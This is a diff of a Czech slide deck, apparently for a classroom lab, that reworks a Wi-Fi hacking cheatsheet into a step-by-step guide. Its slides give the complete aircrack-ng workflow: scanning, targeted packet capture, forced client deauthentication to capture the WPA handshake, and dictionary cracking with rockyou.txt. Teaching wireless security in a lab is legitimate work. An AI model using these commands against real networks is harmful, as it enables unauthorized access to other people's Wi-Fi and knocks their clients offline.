@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wi-Fi Hacking Cheatsheet - Příkazy krok za krokem</title>
+    <title>Návod: Hacking Wi-Fi krok za krokem</title>
     <link rel="stylesheet" href="dist/reset.css">
     <link rel="stylesheet" href="dist/reveal.css">
     <link rel="stylesheet" href="dist/theme/white.css" id="theme">
@@ -11,8 +11,22 @@
     <link rel="stylesheet" href="css/presentation.css">
     <style>
       .code-block {
-        font-size: 0.7em;
+        font-size: 0.85em;
         line-height: 1.4;
+      }
+      .guide-box {
+        background-color: #f8f9fa;
+        border-left: 5px solid #007acc;
+        padding: 1.2rem;
+        margin-top: 1rem;
+        text-align: left;
+        font-size: 0.9em;
+      }
+      .step-title {
+        color: #f6821f;
+        font-weight: bold;
+        font-size: 1.2em;
+        margin-bottom: 0.5rem;
       }
     </style>
   </head>
@@ -20,43 +34,100 @@
     <div class="reveal">
       <div class="slides">
 
-        <!-- Slide 1: Krok 1 & 2 -->
+        <!-- Slide 1: Úvod návodu -->
         <section>
-          <h2>Krok 1 &amp; 2: Kontrola a Skenování</h2>
-          <div style="text-align: left; font-size: 0.85em;">
-            <p><strong>1. Ověření rozhraní v Monitor módu:</strong></p>
-            <pre><code class="language-bash code-block">iwconfig</code></pre>
-            
-            <p style="margin-top: 1.5rem;"><strong>2. Skenování všech sítí v dosahu:</strong></p>
-            <pre><code class="language-bash code-block">sudo airodump-ng wlan0mon</code></pre>
-            <p style="font-size: 0.8em; color: #555;">&rarr; V tabulce si poznamenej <strong>BSSID</strong> (MAC routeru) a <strong>CH</strong> (číslo kanálu) vaší sítě.</p>
+          <h1>Návod: Hacking Wi-Fi</h1>
+          <p style="font-size: 1.2em; color: #555;">Praktický postup příkaz za příkazem</p>
+          <div class="guide-box" style="margin-top: 2rem;">
+            <p><strong>Předpoklad:</strong> Vaše Wi-Fi karta je již v <strong>Monitor módu</strong> (rozhraní <code>wlan0mon</code>).</p>
+            <p>Postupujte podle jednotlivých slajdů krok za krokem.</p>
           </div>
         </section>
 
-        <!-- Slide 2: Krok 3 & 4 -->
+        <!-- Slide 2: Krok 1 -->
         <section>
-          <h2>Krok 3 &amp; 4: Zacílení a Deautentizace</h2>
-          <div style="text-align: left; font-size: 0.85em;">
-            <p><strong>3. Zacílení a ukládání paketů do souboru (Okno 1):</strong></p>
-            <pre><code class="language-bash code-block">sudo airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w pokus wlan0mon</code></pre>
-            <p style="font-size: 0.8em; color: #555;">&rarr; Toto okno nechte běhat! Poznamenej si MAC klienta z dolní části (STATION).</p>
+          <div class="step-title">1. Krok — Kontrola síťové karty</div>
+          <p style="text-align: left; font-size: 0.9em;">Spusťte příkaz pro ověření rozhraní v Monitor módu:</p>
+          
+          <pre><code class="language-bash code-block">iwconfig</code></pre>
 
-            <p style="margin-top: 1.5rem;"><strong>4. Vynucení odpojení a přihlášení klienta (Okno 2):</strong></p>
-            <pre><code class="language-bash code-block">sudo aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 -c 99:88:77:66:55:44 wlan0mon</code></pre>
+          <div class="guide-box">
+            <p><strong>Co hledám:</strong> Ověřím, že vidím rozhraní <code>wlan0mon</code> (nebo <code>wlan0</code>) s textem <code>Mode:Monitor</code>.</p>
           </div>
         </section>
 
-        <!-- Slide 3: Krok 5 & 6 -->
+        <!-- Slide 3: Krok 2 -->
         <section>
-          <h2>Krok 5 &amp; 6: Ověření a Prolomení Hesla</h2>
-          <div style="text-align: left; font-size: 0.85em;">
-            <p><strong>5. Ověření v Okna 1 (vpravo nahoře):</strong></p>
+          <div class="step-title">2. Krok — Skenování sítí v okolí</div>
+          <p style="text-align: left; font-size: 0.9em;">Spusťte skenování všech Wi-Fi kanálů ve vzduchu:</p>
+          
+          <pre><code class="language-bash code-block">sudo airodump-ng wlan0mon</code></pre>
+
+          <div class="guide-box">
+            <p><strong>Co dělám:</strong> V seznamu najdu testovací síť učebny a poznamenám si na papír:</p>
+            <ul>
+              <li><strong>BSSID:</strong> MAC adresa routeru (např. <code>AA:BB:CC:11:22:33</code>)</li>
+              <li><strong>CH:</strong> Číslo kanálu (např. <code>6</code>)</li>
+            </ul>
+          </div>
+        </section>
+
+        <!-- Slide 4: Krok 3 -->
+        <section>
+          <div class="step-title">3. Krok — Zacílení na síť a ukládání paketů</div>
+          <p style="text-align: left; font-size: 0.9em;">Zaměřte skenování na vybraný kanál a BSSID a ukládejte pakety:</p>
+          
+          <pre><code class="language-bash code-block">sudo airodump-ng -c <KANÁL> --bssid <BSSID> -w pokus wlan0mon</code></pre>
+
+          <p style="text-align: left; font-size: 0.8em; margin-top: 0.5rem; color: #555;">Příklad:</p>
+          <pre><code class="language-bash code-block">sudo airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w pokus wlan0mon</code></pre>
+
+          <div class="guide-box">
+            <p><strong>DŮLEŽITÉ:</strong> Toto okno nechte běhat! Ukládá pakety do <code>pokus-01.cap</code>. V dolní části si poznamenejte MAC adresu připojeného klienta (<code>STATION</code>).</p>
+          </div>
+        </section>
+
+        <!-- Slide 5: Krok 4 -->
+        <section>
+          <div class="step-title">4. Krok — Vynucení přihlášení (Deautentizace)</div>
+          <p style="text-align: left; font-size: 0.9em;">Otevřete <strong>DRUHÉ okno terminálu</strong> a odešlete deautentizaci:</p>
+          
+          <pre><code class="language-bash code-block">sudo aireplay-ng --deauth 5 -a <BSSID> -c <MAC_KLIENTA> wlan0mon</code></pre>
+
+          <p style="text-align: left; font-size: 0.8em; margin-top: 0.5rem; color: #555;">Příklad:</p>
+          <pre><code class="language-bash code-block">sudo aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 -c 99:88:77:66:55:44 wlan0mon</code></pre>
+
+          <div class="guide-box">
+            <p><strong>Co se stane:</strong> Příkaz odpojí klienta na vteřinu. Klient se automaticky zkusí přihlásit zpět a tím vygeneruje nový 4-Way Handshake.</p>
+          </div>
+        </section>
+
+        <!-- Slide 6: Krok 5 -->
+        <section>
+          <div class="step-title">5. Krok — Kontrola zachycení Handshaku</div>
+          <p style="text-align: left; font-size: 0.9em;">Přepněte se zpět do <strong>PRVNÍHO okna terminálu</strong> (kde běží airodump-ng):</p>
+          
+          <div class="guide-box" style="border-left-color: #28a745; margin-top: 1rem;">
+            <p style="color: #28a745; font-weight: bold; font-size: 1.1em;">Hledám vpravo nahoře hlášku:</p>
             <pre><code class="language-bash code-block">[ WPA handshake: AA:BB:CC:11:22:33 ]</code></pre>
-            <p style="font-size: 0.8em; color: #555;">&rarr; Jakmile uvidíš hlášku WPA handshake, stiskni <code>Ctrl + C</code>.</p>
+          </div>
 
-            <p style="margin-top: 1.5rem;"><strong>6. Slovníkový útok (Aircrack-ng):</strong></p>
-            <pre><code class="language-bash code-block">aircrack-ng -w /usr/share/wordlists/rockyou.txt pokus-01.cap</code></pre>
-            <p style="font-size: 0.85em; color: #28a745; font-weight: bold; margin-top: 0.5rem;">&rarr; KEY FOUND! [ heslo ]</p>
+          <div class="guide-box" style="margin-top: 1rem;">
+            <p><strong>Co udělat po zachycení:</strong> Stiskněte <code>Ctrl + C</code> pro ukončení skenování. Váš Handshake je uložený v souboru <code>pokus-01.cap</code>.</p>
+          </div>
+        </section>
+
+        <!-- Slide 7: Krok 6 -->
+        <section>
+          <div class="step-title">6. Krok — Prolomení hesla ze slovníku</div>
+          <p style="text-align: left; font-size: 0.9em;">Spusťte louskání hesla ze slovníku <code>rockyou.txt</code>:</p>
+          
+          <pre><code class="language-bash code-block">aircrack-ng -w /usr/share/wordlists/rockyou.txt pokus-01.cap</code></pre>
+
+          <div class="guide-box" style="border-left-color: #28a745; margin-top: 1rem;">
+            <p style="color: #28a745; font-weight: bold; font-size: 1.1em;">Při úspěšném odhalení uvidíte:</p>
+            <pre><code class="language-bash code-block">KEY FOUND! [ mojelaboratorniheslo ]</code></pre>
+            <p><strong>Hotovo!</strong> Heslo bylo úspěšně prolomeno.</p>
           </div>
         </section>
 
